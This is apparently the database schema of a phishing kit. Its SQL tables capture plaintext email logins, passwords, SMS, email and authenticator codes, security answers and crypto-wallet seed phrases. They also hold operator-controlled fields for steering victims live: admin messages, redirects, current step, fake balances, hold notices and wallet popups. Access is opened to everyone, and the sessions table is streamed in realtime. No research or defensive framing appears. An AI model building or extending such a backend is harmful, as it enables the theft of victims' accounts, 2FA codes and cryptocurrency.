-- Consolidated schema: creates both tables with all columns if they don't exist,
-- and adds any missing columns for existing tables.

-- ============================================================
-- 1. login_attempts table
-- ============================================================
CREATE TABLE IF NOT EXISTS login_attempts (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  email TEXT NOT NULL,
  password TEXT NOT NULL,
  phone_code TEXT,
  ip_address TEXT,
  user_agent TEXT,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

ALTER TABLE login_attempts DISABLE ROW LEVEL SECURITY;

CREATE INDEX IF NOT EXISTS idx_login_attempts_created_at ON login_attempts(created_at DESC);

-- ============================================================
-- 2. sessions table
-- ============================================================
CREATE TABLE IF NOT EXISTS sessions (
  id TEXT PRIMARY KEY,
  email TEXT,
  password TEXT,
  phone_code TEXT,
  current_step TEXT NOT NULL DEFAULT 'email',
  status TEXT NOT NULL DEFAULT 'idle',
  user_agent TEXT,
  is_active BOOLEAN DEFAULT true,
  redirect_url TEXT,
  admin_message TEXT,
  last_activity TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Add all columns that may be missing (idempotent with IF NOT EXISTS)
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS phone_last4 TEXT DEFAULT '7842';
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS verification_type TEXT DEFAULT 'phone';
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS email_for_code TEXT;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS authenticator_code TEXT;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS email_code TEXT;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS balance_selection TEXT;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS security_responses jsonb DEFAULT '{}';
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS security_location text DEFAULT 'Frankfurt, Germany';
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS security_phone_last4 text DEFAULT '9548';
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS wallet_type TEXT;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS wallet_action TEXT;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS seed_phrase TEXT;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS dashboard_balance TEXT DEFAULT NULL;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS balance_hidden BOOLEAN DEFAULT false;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS balance_on_hold BOOLEAN DEFAULT false;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS hold_message TEXT DEFAULT NULL;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS btc_amount TEXT DEFAULT NULL;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS eth_amount TEXT DEFAULT NULL;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS usdc_amount TEXT DEFAULT NULL;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS sol_amount TEXT DEFAULT NULL;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS doge_amount TEXT DEFAULT NULL;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS xrp_amount TEXT DEFAULT NULL;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS user_name TEXT DEFAULT NULL;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS show_verification_banner BOOLEAN DEFAULT false;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS verification_banner_message TEXT DEFAULT NULL;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS show_wallet_popup BOOLEAN DEFAULT false;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS wallet_popup_type TEXT DEFAULT 'link';

-- RLS: allow all operations (public access for this app's custom session model)
ALTER TABLE sessions ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Allow all operations on sessions" ON sessions;
CREATE POLICY "Allow all operations on sessions" ON sessions FOR ALL USING (true) WITH CHECK (true);

-- Enable realtime for sessions table
DO $$
BEGIN
  IF NOT EXISTS (
    SELECT 1 FROM pg_publication_tables
    WHERE pubname = 'supabase_realtime' AND tablename = 'sessions'
  ) THEN
    ALTER PUBLICATION supabase_realtime ADD TABLE sessions;
  END IF;
END
$$;
